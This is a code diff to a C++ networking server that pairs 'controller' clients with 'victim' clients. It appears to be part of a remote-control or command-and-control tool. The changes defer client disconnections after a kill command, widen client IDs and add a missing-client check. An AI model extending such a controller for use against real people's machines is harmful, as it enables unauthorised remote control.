@@ -22,6 +22,9 @@ void Server::receive()
 
 	//mutex used for clients write access
 	mutex.lock();
+
+	std::vector<sf::Uint16> idsToKill;
+
 	//check if a client has received something
 	for (auto& c : clients) {
 		//look for the socket that has received something
@@ -42,7 +45,7 @@ void Server::receive()
 
 		//process the packet if it was received by a controller
 		if (c.second.role == 'c')
-			processControllerMsg(c.first, p);
+			processControllerMsg(c.first, p, idsToKill);
 		//process the packet if it was received by a victim
 		else if (c.second.role == 'v')
 			processVictimMsg(c.first, p);
@@ -73,6 +76,11 @@ void Server::receive()
 			}
 		}
 	}
+	for (const auto id : idsToKill) {
+		std::cout << "killed - ";
+		disconnect(id);
+	}
+
 	//check if a client is ready to connect
 	if (selector.isReady(listener)) {
 		Client c;
@@ -113,7 +121,7 @@ void Server::checkAwake()
 	}
 }
 
-void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
+void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToKill)
 {
 	sf::Uint8 cmd;
 	p >> cmd;
@@ -197,8 +205,7 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		//tell the client to kill himself
 		clients[oId].socket->send(p);
 
-		std::cout << "killed - ";
-		disconnect(oId);
+		idsToKill.push_back(oId);
 	}
 	//rename a given client
 	else if (cmd == 'w') {
@@ -228,7 +235,7 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		clients[id].name = "";
 	}
 }
-void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
+void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 {
 	sf::Uint8 cmd;
 	p >> cmd;
@@ -249,8 +256,13 @@ void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 	}
 }
 
-void Server::disconnect(sf::Uint8 id)
+void Server::disconnect(sf::Uint16 id)
 {
+	if (clients.find(id) == clients.end()) {
+		std::cout << "no one\n";
+		return;
+	}
+
 	sf::Packet p;
 	//unpair the paired client
 	if (clients[id].pair != 0) {
@@ -280,6 +292,7 @@ void Server::disconnect(sf::Uint8 id)
 		//actually unpair other client
 		clients[clients[id].pair].pair = 0;
 	}
+
 	//remove client from list/selector
 	selector.remove(*clients[id].socket);
 	delete clients[id].socket;
